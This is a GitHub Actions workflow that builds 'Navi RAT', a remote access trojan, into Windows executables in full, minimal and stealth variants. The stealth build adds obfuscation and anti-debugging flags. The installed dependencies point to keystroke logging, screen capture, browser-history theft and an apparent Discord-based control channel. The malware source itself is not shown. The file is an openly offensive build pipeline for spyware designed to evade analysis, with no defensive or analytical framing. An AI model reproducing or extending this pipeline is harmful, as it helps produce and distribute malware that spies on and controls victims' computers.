name: Build Navi RAT

on:
  workflow_dispatch:
    inputs:
      build_type:
        description: 'Build configuration'
        required: true
        default: 'full'
        type: choice
        options:
          - full
          - minimal
          - stealth

jobs:
  build-rat:
    runs-on: windows-latest
    timeout-minutes: 30

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Python 3.10
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'
          architecture: 'x64'

      - name: Cache pip packages
        uses: actions/cache@v4
        with:
          path: ~\AppData\Local\pip\Cache
          key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip setuptools wheel
          pip install -r requirements.txt
          pip install pyinstaller pywin32 discord.py requests comtypes pycaw pyautogui browserhistory mss pynput pillow psutil wmi GPUtil

      - name: Build RAT (Full)
        if: ${{ github.event.inputs.build_type == 'full' }}
        run: |
          python modules/builder/rat_builder.py --full --output dist/rat_full.exe

      - name: Build RAT (Minimal)
        if: ${{ github.event.inputs.build_type == 'minimal' }}
        run: |
          python modules/builder/rat_builder.py --minimal --output dist/rat_minimal.exe

      - name: Build RAT (Stealth)
        if: ${{ github.event.inputs.build_type == 'stealth' }}
        run: |
          python modules/builder/rat_builder.py --stealth --obfuscate --anti-debug --output dist/rat_stealth.exe

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: navi-rat-${{ github.event.inputs.build_type }}-${{ github.run_number }}
          path: dist/*.exe
          retention-days: 30
